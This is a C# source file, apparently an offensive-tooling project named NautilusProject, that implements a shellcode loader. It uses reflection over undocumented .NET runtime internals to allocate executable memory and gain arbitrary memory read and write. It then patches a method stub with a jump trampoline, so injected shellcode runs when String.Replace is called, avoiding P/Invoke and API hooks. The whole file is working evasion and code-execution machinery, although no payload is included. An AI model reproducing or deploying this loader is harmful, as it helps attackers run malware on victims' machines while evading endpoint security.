using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

namespace NautilusProject
{
    internal class CombinedExec
    {
        public static IntPtr AllocMemory(int length)
        {
            var kernel32 = typeof(System.String).Assembly.GetType("Interop+Kernel32");
            var VirtualAlloc = kernel32.GetMethod("VirtualAlloc", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

            var ptr = VirtualAlloc.Invoke(null, new object[] { IntPtr.Zero, new UIntPtr((uint)length), Internals.AllocationType.Commit | Internals.AllocationType.Reserve, Internals.MemoryProtection.ExecuteReadWrite });

            IntPtr mem = (IntPtr)ptr.GetType().GetMethod("GetPointerValue", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(ptr, new object[] { });

            return mem;
        }

        public static void WriteMemory(IntPtr addr, IntPtr value)
        {
            var mngdRefCustomeMarshaller = typeof(System.String).Assembly.GetType("System.StubHelpers.MngdRefCustomMarshaler");
            var CreateMarshaler = mngdRefCustomeMarshaller.GetMethod("CreateMarshaler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

            CreateMarshaler.Invoke(null, new object[] { addr, value });
        }

        public static IntPtr ReadMemory(IntPtr addr)
        {
            var stubHelper = typeof(System.String).Assembly.GetType("System.StubHelpers.StubHelpers");
            var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

            IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);
            for (int i = 0; i < 200; i += IntPtr.Size)
            {
                Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
            }

            return (IntPtr)GetNDirectTarget.Invoke(null, new object[] { unmanagedPtr });
        }

        public static void CopyMemory(byte[] source, IntPtr dest)
        {
            // Pad to IntPtr length
            if ((source.Length % IntPtr.Size) != 0)
            {
                source = source.Concat<byte>(new byte[source.Length % IntPtr.Size]).ToArray();
            }

            GCHandle pinnedArray = GCHandle.Alloc(source, GCHandleType.Pinned);
            IntPtr sourcePtr = pinnedArray.AddrOfPinnedObject();

            for (int i = 0; i < source.Length; i += IntPtr.Size)
            {
                WriteMemory(dest + i, ReadMemory(sourcePtr + i));
            }
        }

        public static void Execute(byte[] shellcode)
        {
            // mov rax, 0x4141414141414141
            // jmp rax
            var jmpCode = new byte[] { 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xE0 };

            var t = typeof(System.String);

            var ecBase = ReadMemory(t.TypeHandle.Value + 0x28);

            var mdcBase = ReadMemory(ecBase + 0x20);

            IntPtr stub = ReadMemory(mdcBase + 0x18 + 8);

            var kernel32 = typeof(System.String).Assembly.GetType("Interop+Kernel32");
            var VirtualAlloc = kernel32.GetMethod("VirtualAlloc", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

            var ptr = VirtualAlloc.Invoke(null, new object[] { IntPtr.Zero, new UIntPtr((uint)shellcode.Length), Internals.AllocationType.Commit | Internals.AllocationType.Reserve, Internals.MemoryProtection.ExecuteReadWrite });

            IntPtr mem = (IntPtr)ptr.GetType().GetMethod("GetPointerValue", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(ptr, new object[] { });

            CopyMemory(shellcode, mem);

            CopyMemory(jmpCode, stub);

            WriteMemory(stub + 2, mem);

            "ANYSTRING".Replace("XPN", "WAZ'ERE", true, null);
        }

        public static class Internals
        {
            [Flags]
            public enum AllocationType
            {
                Commit = 0x1000,
                Reserve = 0x2000,
                Decommit = 0x4000,
                Release = 0x8000,
                Reset = 0x80000,
                Physical = 0x400000,
                TopDown = 0x100000,
                WriteWatch = 0x200000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                Execute = 0x10,
                ExecuteRead = 0x20,
                ExecuteReadWrite = 0x40,
                ExecuteWriteCopy = 0x80,
                NoAccess = 0x01,
                ReadOnly = 0x02,
                ReadWrite = 0x04,
                WriteCopy = 0x08,
                GuardModifierflag = 0x100,
                NoCacheModifierflag = 0x200,
                WriteCombineModifierflag = 0x400
            }
        }
    }
}